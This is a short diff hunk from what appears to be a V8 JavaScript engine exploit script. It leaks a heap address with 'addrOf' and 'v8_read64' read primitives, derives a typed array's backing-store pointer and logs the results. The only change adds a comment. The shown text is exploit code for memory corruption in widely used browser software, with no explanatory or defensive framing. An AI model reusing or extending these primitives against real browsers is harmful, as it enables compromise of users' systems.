@@ -44,7 +44,7 @@ let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
 console.log("heap_addr: 0x" + heap_addr.toString(16));
 
 // ================= reading started array address ===============
-let started_array = v8_read64(addrOf(u16arr) + 0x2f + 1) >> 0x18n;//
+let started_array = v8_read64(addrOf(u16arr) + 0x2f + 1) >> 0x18n;// buffer pointer
 started_array = Number(started_array + high_ofs_started_page);
 console.log("started_array: 0x" + started_array.toString(16));
 console.log("==================================================================");
